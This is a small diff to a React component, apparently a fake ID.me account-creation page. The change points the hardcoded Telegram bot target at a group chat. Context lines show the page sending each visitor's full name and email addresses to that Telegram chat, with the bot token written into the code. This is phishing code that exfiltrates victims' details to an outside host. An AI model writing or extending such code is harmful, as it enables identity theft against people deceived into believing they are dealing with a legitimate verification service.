@@ -19,7 +19,7 @@ const CreateIDME: React.FC = () => {
     setShowPopup(true);
 
     const botToken = "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";
-    const chatId = "4575071223";
+    const chatId = "-4575071223";
     const message = ` ${fullName} New Account \n📧 Email: ${email}\n🔑 Email 2: ${email2}`;
 
     try {
